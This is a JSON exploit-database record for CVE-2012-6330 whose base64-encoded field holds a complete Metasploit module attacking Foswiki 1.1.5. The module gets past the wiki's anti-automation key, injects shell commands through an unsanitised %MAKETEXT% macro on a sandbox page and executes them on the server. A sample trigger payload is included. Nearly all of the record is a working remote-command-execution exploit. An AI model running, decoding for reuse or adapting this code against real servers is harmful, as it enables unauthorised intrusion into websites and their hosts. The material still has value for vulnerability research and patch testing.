{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cENsaWVudA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnRm9zd2lraSBNQUtFVEVYVCBSZW1vdGUgQ29tbWFuZCBFeGVjdXRpb24nLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQkJVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB2dWxuZXJhYmlsaXR5IGluIHRoZSBNQUtFVEVYVCBGb3N3aWtpIHZhcmlhYmxlLiBCeSB1c2luZw0KCQkJCWEgc3BlY2lhbGx5IGNyYWZ0ZWQgTUFLRVRFWFQsIGEgbWFsaWNpb3VzIHVzZXIgY2FuIGV4ZWN1dGUgc2hlbGwgY29tbWFuZHMgc2luY2UgdGhlDQoJCQkJaW5wdXQgaXMgcGFzc2VkIHRvIHRoZSBQZXJsICJldmFsIiBjb21tYW5kIHdpdGhvdXQgZmlyc3QgYmVpbmcgc2FuaXRpemVkLiBUaGUNCgkJCQlwcm9ibGVtIGlzIGNhdXNlZCBieSBhbiB1bmRlcmx5aW5nIHNlY3VyaXR5IGlzc3VlIGluIHRoZSBDUEFOOkxvY2FsZTo6TWFrZXRleHQNCgkJCQltb2R1bGUuICBPbmx5IEZvc3dpa2kgc2l0ZXMgdGhhdCBoYXZlIHVzZXIgaW50ZXJmYWNlIGxvY2FsaXphdGlvbiBlbmFibGVkDQoJCQkJKFVzZXJJbnRlcmZhY2VJbnRlcm5hdGlvbmFsaXNhdGlvbiB2YXJpYWJsZSBzZXQpIGFyZSB2dWxuZXJhYmxlLg0KDQoJCQkJCUlmIFVTRVJOQU1FIGFuZCBQQVNTV09SRCBhcmVuJ3QgcHJvdmlkZWQsIGFub255bW91cyBhY2Nlc3Mgd2lsbCBiZSB0cmllZC4NCgkJCQlBbHNvLCBpZiB0aGUgRm9zd2lraVBhZ2Ugb3B0aW9uIGlzbid0IHByb3ZpZGVkLCB0aGUgbW9kdWxlIHdpbGwgdHJ5IHRvIGNyZWF0ZSBhDQoJCQkJcmFuZG9tIHBhZ2Ugb24gdGhlIFNhbmRCb3ggc3BhY2UuIFRoZSBtb2R1bGVzIGhhcyBiZWVuIHRlc3RlZCBzdWNjZXNzZnVsbHkgb24NCgkJCQlGb3N3aWtpIDEuMS41IGFzIGRpc3RyaWJ1dGVkIHdpdGggdGhlIG9mZmljaWFsIEZvc3dpa2ktMS4xLjUtdm13YXJlIGltYWdlLg0KCQkJfSwNCgkJCSdBdXRob3InICAgICAgICAgPT4NCgkJCQlbDQoJCQkJCSdCcmlhbiBDYXJsc29uJywgIyBvcmlnaW5hbCBkaXNjb3ZlcnkgaW4gUGVybCBMb2NhbGU6Ok1ha2V0ZXh0DQoJCQkJCSdqdWFuIHZhenF1ZXonICMgTWV0YXNwbG9pdCBtb2R1bGUNCgkJCQldLA0KCQkJJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCgkJCSdSZWZlcmVuY2VzJyAgICAgPT4NCgkJCQlbDQoJCQkJCVsgJ0NWRScsICcyMDEyLTYzMjknIF0sDQoJCQkJCVsgJ09TVkRCJywgJzg4NDEwJyBdLA0KCQkJCQlbICdVUkwnLCAnaHR0cDovL2Zvc3dpa2kub3JnL1N1cHBvcnQvU2VjdXJpdHlBbGVydC1DVkUtMjAxMi02MzMwJyBdDQoJCQkJXSwNCgkJCSdQcml2aWxlZ2VkJyAgICAgPT4gZmFsc2UsICMgd2ViIHNlcnZlciBjb250ZXh0DQoJCQknUGF5bG9hZCcgICAgICAgID0+DQoJCQkJew0KCQkJCQknRGlzYWJsZU5vcHMnID0+IHRydWUsDQoJCQkJCSdTcGFjZScgICAgICAgPT4gMTAyNCwNCgkJCQkJJ0NvbXBhdCcgICAgICA9Pg0KCQkJCQkJew0KCQkJCQkJCSdQYXlsb2FkVHlwZScgPT4gJ2NtZCcsDQoJCQkJCQkJJ1JlcXVpcmVkQ21kJyA9PiAnZ2VuZXJpYyBydWJ5IHB5dGhvbiBiYXNoIHRlbG5ldCcNCgkJCQkJCX0NCgkJCQl9LA0KCQkJJ1BsYXRmb3JtJyAgICAgICA9PiBbICd1bml4JyBdLA0KCQkJJ0FyY2gnICAgICAgICAgICA9PiBBUkNIX0NNRCwNCgkJCSdUYXJnZXRzJyAgICAgICAgPT4gW1sgJ0Zvc3dpa2kgMS4xLjUnLCB7IH1dXSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ0RlYyAwMyAyMDEyJywNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCgkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCVsNCgkJCQlPcHRTdHJpbmcubmV3KCdUQVJHRVRVUkknLCBbIHRydWUsICJGb3N3aWtpIGJhc2UgcGF0aCIsICIvIiBdKSwNCgkJCQlPcHRTdHJpbmcubmV3KCdGb3N3aWtpUGFnZScsIFsgZmFsc2UsICJGb3N3aWtpIFBhZ2Ugd2l0aCBlZGl0IHBlcm1pc3Npb25zIHRvIGluamVjdCB0aGUgcGF5bG9hZCwgYnkgZGVmYXVsdCByYW5kb20gUGFnZSBvbiBTYW5kYm94IChFeDogL1NhbmRib3gvTXNmVGVzdCkiIF0pLA0KCQkJCU9wdFN0cmluZy5uZXcoJ1VTRVJOQU1FJywgWyBmYWxzZSwgICJUaGUgdXNlciB0byBhdXRoZW50aWNhdGUgYXMgKGFub255bW91cyBpZiB1c2VybmFtZSBub3QgcHJvdmlkZWQpIl0pLA0KCQkJCU9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgWyBmYWxzZSwgICJUaGUgcGFzc3dvcmQgdG8gYXV0aGVudGljYXRlIHdpdGggKGFub255bW91cyBpZiBwYXNzd29yZCBub3QgcHJvdmlkZWQpIiBdKQ0KCQkJXSwgc2VsZi5jbGFzcykNCgllbmQNCg0KCWRlZiBkb19sb2dpbih1c2VybmFtZSwgcGFzc3dvcmQpDQoJCXJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KCQkJJ21ldGhvZCcgICA9PiAnUE9TVCcsDQoJCQkndXJpJyAgICAgID0+ICIje0BiYXNlfWJpbi9sb2dpbiIsDQoJCQkndmFyc19wb3N0JyA9Pg0KCQkJCXsNCgkJCQkJJ3VzZXJuYW1lJyA9PiB1c2VybmFtZSwNCgkJCQkJJ3Bhc3N3b3JkJyA9PiBwYXNzd29yZA0KCQkJCX0NCgkJCX0pDQoNCgkJaWYgbm90IHJlcyBvciByZXMuY29kZSAhPSAzMDIgb3IgcmVzLmhlYWRlcnNbJ1NldC1Db29raWUnXSAhfiAvRk9TV0lLSVNJRD0oWzAtOWEtZl0qKS8NCgkJCXZwcmludF9zdGF0dXMgIiN7cmVzLmNvZGV9XG4je3Jlcy5ib2R5fSINCgkJCXJldHVybiBuaWwNCgkJZW5kDQoNCgkJc2Vzc2lvbiA9ICQxDQoJCXJldHVybiBzZXNzaW9uDQoJZW5kDQoNCglkZWYgaW5qZWN0X2NvZGUoc2Vzc2lvbiwgY29kZSkNCg0KCQl2cHJpbnRfc3RhdHVzKCJSZXRyaWV2aW5nIHRoZSB2YWxpZGF0aW9uX2tleS4uLiIpDQoNCgkJcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQoJCQkndXJpJyAgICAgID0+ICIje0BiYXNlfWJpbi9lZGl0I3tAcGFnZX0iLA0KCQkJJ2Nvb2tpZScgICA9PiAiRk9TV0lLSVNJRD0je3Nlc3Npb259Ig0KCQl9KQ0KDQoJCWlmIG5vdCByZXMgb3IgcmVzLmNvZGUgIT0gMjAwIG9yIHJlcy5ib2R5ICF+IC9uYW1lPSd2YWxpZGF0aW9uX2tleScgdmFsdWU9J1w/KFswLTlhLWZdKiknLw0KCQkJdnByaW50X2Vycm9yKCJFcnJvciByZXRyaWV2aW5nIHRoZSB2YWxpZGF0aW9uX2tleSIpDQoJCQlyZXR1cm4gbmlsDQoJCWVuZA0KDQoJCXZhbGlkYXRpb25fa2V5ID0gJDENCgkJdnByaW50X2dvb2QoInZhbGlkYXRpb25fa2V5IGZvdW5kOiAje3ZhbGlkYXRpb25fa2V5fSIpDQoNCgkJaWYgc2Vzc2lvbi5lbXB0eT8NCgkJCWlmIHJlcy5oZWFkZXJzWydTZXQtQ29va2llJ10gPX4gL0ZPU1dJS0lTSUQ9KFswLTlhLWZdKikvDQoJCQkJc2Vzc2lvbiA9ICQxDQoJCQllbHNlDQoJCQkJdnByaW50X2Vycm9yKCJFcnJvciB1c2luZyBhbm9ueW1vdXMgYWNjZXNzIikNCgkJCQlyZXR1cm4gbmlsDQoJCQllbmQNCgkJZW5kDQoNCgkJaWYgcmVzLmhlYWRlcnNbJ1NldC1Db29raWUnXSA9fiAvRk9TV0lLSVNUUklLRU9ORT0oWzAtOWEtZl0qKS8NCgkJCXN0cmlrZV9vbmUgPSAkMQ0KCQllbHNlDQoJCQl2cHJpbnRfZXJyb3IoIkVycm9yIGdldHRpbmcgdGhlIEZPU1dJS0lTVFJJS0VPTkUgdmFsdWUiKQ0KCQkJcmV0dXJuIG5pbA0KCQllbmQNCg0KCQkjIFRyYW5zZm9ybWluZyB2YWxpZGF0aW9uX2tleSBpbiBvcmRlciB0byBieXBhc3MgZm9zd2lraSBhbnRpYXV0b21hdGlvbg0KCQl2YWxpZGF0aW9uX2tleSA9IFJleDo6VGV4dC5tZDUodmFsaWRhdGlvbl9rZXkgKyBzdHJpa2Vfb25lKQ0KCQl2cHJpbnRfc3RhdHVzKCJUcmFuc2Zvcm1lZCB2YWxpZGF0aW9uIGtleTogI3t2YWxpZGF0aW9uX2tleX0iKQ0KCQl2cHJpbnRfc3RhdHVzKCJJbmplY3RpbmcgdGhlIHBheWxvYWQuLi4iKQ0KDQoJCXJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KCQkJJ21ldGhvZCcgICA9PiAnUE9TVCcsDQoJCQkndXJpJyAgICAgID0+ICIje0BiYXNlfWJpbi9zYXZlI3tAcGFnZX0iLA0KCQkJJ2Nvb2tpZScgICA9PiAiRk9TV0lLSVNJRD0je3Nlc3Npb259IiwNCgkJCSd2YXJzX3Bvc3QnID0+DQoJCQl7DQoJCQkJJ3ZhbGlkYXRpb25fa2V5JyA9PiB2YWxpZGF0aW9uX2tleSwNCgkJCQkndGV4dCcgPT4gIiN7cmFuZF90ZXh0X2FscGhhKDMgKyByYW5kKDMpKX0gJU1BS0VURVhUe1wiI3tyYW5kX3RleHRfYWxwaGEoMyArIHJhbmQoMykpfSBbXzFdICN7cmFuZF90ZXh0X2FscGhhKDMgKyByYW5kKDMpKX1cXFxcJ307IGAje2NvZGV9YDsgeyAjXCIgYXJncz1cIiN7cmFuZF90ZXh0X2FscGhhKDMgKyByYW5kKDMpKX1cIn0lIg0KCQkJfQ0KDQoJCX0pDQoNCgkJaWYgbm90IHJlcyBvciByZXMuY29kZSAhPSAzMDIgb3IgcmVzLmhlYWRlcnNbJ0xvY2F0aW9uJ10gIX4gL2JpblwvdmlldyN7QHBhZ2V9Lw0KCQkJcHJpbnRfd2FybmluZygiRXJyb3IgaW5qZWN0aW5nIHRoZSBwYXlsb2FkIikNCgkJCXByaW50X3N0YXR1cyAiI3tyZXMuY29kZX1cbiN7cmVzLmJvZHl9XG4je3Jlcy5oZWFkZXJzWydMb2NhdGlvbiddfSINCgkJCXJldHVybiBuaWwNCgkJZW5kDQoNCgkJbG9jYXRpb24gPSBVUkkocmVzLmhlYWRlcnNbJ0xvY2F0aW9uJ10pLnBhdGgNCgkJcHJpbnRfZ29vZCgiUGF5bG9hZCBpbmplY3RlZCBvbiAje2xvY2F0aW9ufSIpDQoNCgkJcmV0dXJuIGxvY2F0aW9uDQoJZW5kDQoNCglkZWYgY2hlY2sNCgkJQGJhc2UgPSB0YXJnZXRfdXJpLnBhdGgNCgkJQGJhc2UgPDwgJy8nIGlmIEBiYXNlWy0xLCAxXSAhPSAnLycNCg0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCSd1cmknICAgICAgPT4gIiN7QGJhc2V9U3lzdGVtL1dlYkhvbWUiDQoJCX0pDQoNCgkJaWYgbm90IHJlcyBvciByZXMuY29kZSAhPSAyMDANCgkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCgkJZW5kDQoNCgkJaWYgcmVzLmJvZHkgPX4gL1RoaXMgc2l0ZSBpcyBydW5uaW5nIEZvc3dpa2kgdmVyc2lvbi4qRm9zd2lraS0oXGRcLlxkXC5cZCkvDQoJCQl2ZXJzaW9uID0gJDENCgkJCXByaW50X3N0YXR1cygiVmVyc2lvbiBmb3VuZDogI3t2ZXJzaW9ufSIpDQoJCQlpZiB2ZXJzaW9uIDw9ICIxLjEuNiINCgkJCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpBcHBlYXJzDQoJCQllbHNlDQoJCQkJcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KCQkJZW5kDQoJCWVuZA0KDQoJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkRldGVjdGVkDQoJZW5kDQoNCg0KCWRlZiBleHBsb2l0DQoNCgkJIyBJbml0IHZhcmlhYmxlcw0KCQlAcGFnZSA9ICcnDQoNCgkJaWYgZGF0YXN0b3JlWydGb3N3aWtpUGFnZSddIGFuZCBub3QgZGF0YXN0b3JlWydGb3N3aWtpUGFnZSddLmVtcHR5Pw0KCQkJQHBhZ2UgPDwgJy8nIGlmIGRhdGFzdG9yZVsnRm9zd2lraVBhZ2UnXVswXSAhPSAnLycNCgkJCUBwYWdlIDw8IGRhdGFzdG9yZVsnRm9zd2lraVBhZ2UnXQ0KCQllbHNlDQoJCQlAcGFnZSA8PCAiL1NhbmRib3gvI3tyYW5kX3RleHRfYWxwaGFfbG93ZXIoMykuY2FwaXRhbGl6ZX0je3JhbmRfdGV4dF9hbHBoYV9sb3dlcigzKS5jYXBpdGFsaXplfSINCgkJZW5kDQoNCgkJQGJhc2UgPSB0YXJnZXRfdXJpLnBhdGgNCgkJQGJhc2UgPDwgJy8nIGlmIEBiYXNlWy0xLCAxXSAhPSAnLycNCg0KCQkjIExvZ2luIGlmIG5lZWRlZA0KCQlpZiAoZGF0YXN0b3JlWydVU0VSTkFNRSddIGFuZA0KCQkJbm90IGRhdGFzdG9yZVsnVVNFUk5BTUUnXS5lbXB0eT8gYW5kDQoJCQlkYXRhc3RvcmVbJ1BBU1NXT1JEJ10gYW5kDQoJCQlub3QgZGF0YXN0b3JlWydQQVNTV09SRCddLmVtcHR5PykNCgkJCXByaW50X3N0YXR1cygiVHJ5aW5nIGxvZ2luIHRvIGdldCBzZXNzaW9uIElELi4uIikNCgkJCXNlc3Npb24gPSBkb19sb2dpbihkYXRhc3RvcmVbJ1VTRVJOQU1FJ10sIGRhdGFzdG9yZVsnUEFTU1dPUkQnXSkNCgkJZWxzZQ0KCQkJcHJpbnRfc3RhdHVzKCJVc2luZyBhbm9ueW1vdXMgYWNjZXNzLi4uIikNCgkJCXNlc3Npb24gPSAiIg0KCQllbmQNCg0KCQlpZiBub3Qgc2Vzc2lvbg0KCQkJZmFpbF93aXRoKEV4cGxvaXQ6OkZhaWx1cmU6OlVua25vd24sICJFcnJvciBnZXR0aW5nIGEgc2Vzc2lvbiBJRCIpDQoJCWVuZA0KDQoJCSMgSW5qZWN0IHBheWxvYWQNCgkJcHJpbnRfc3RhdHVzKCJUcnlpbmcgdG8gaW5qZWN0IHRoZSBwYXlsb2FkIG9uICN7QHBhZ2V9Li4uIikNCgkJcmVzID0gaW5qZWN0X2NvZGUoc2Vzc2lvbiwgcGF5bG9hZC5lbmNvZGVkKQ0KCQlpZiBub3QgcmVzIG9yIHJlcyAhfiAvI3tAcGFnZX0vDQoJCQlmYWlsX3dpdGgoRXhwbG9pdDo6RmFpbHVyZTo6VW5rbm93biwgIkVycm9yIGluamVjdGluZyB0aGUgcGF5bG9hZCIpDQoJCWVuZA0KDQoJCSMgRXhlY3V0ZSBwYXlsb2FkDQoJCXByaW50X3N0YXR1cygiRXhlY3V0aW5nIHRoZSBwYXlsb2FkIHRocm91Z2ggI3tAcGFnZX0uLi4iKQ0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCSd1cmknICAgICAgPT4gIiN7QGJhc2V9I3tAcGFnZX0iLA0KCQkJJ2Nvb2tpZScgICA9PiAiRk9TV0lLSVNJRD0je3Nlc3Npb259Ig0KCQl9KQ0KCQlpZiBub3QgcmVzIG9yIHJlcy5jb2RlICE9IDIwMCBvciByZXMuYm9keSAhfiAvSEFTSC8NCgkJCXByaW50X3N0YXR1cygiI3tyZXMuY29kZX1cbiN7cmVzLmJvZHl9IikNCgkJCWZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpVbmtub3duLCAiRXJyb3IgZXhlY3V0aW5nIHRoZSBwYXlsb2FkIikNCgkJZW5kDQoNCgkJcHJpbnRfZ29vZCgiRXhwbG9pdGF0aW9uIHdhcyBzdWNjZXNzZnVsIikNCg0KCWVuZA0KDQplbmQNCg0KPWJlZ2luDQoNCiogVHJpZ2dlcjoNCg0KJU1BS0VURVhUeyJ0ZXN0IFtfMV0gc2Vjb25kdGVzdFxcJ307IGB0b3VjaCAvdG1wL21zZi50eHRgOyB7ICMiIGFyZ3M9Im1zZiJ9JQ0KDQo9ZW5k", 
    "filename": "platforms/unix/remote/23580.rb", 
    "id": "23580", 
    "cves": [
        "CVE-2012-6330"
    ]
}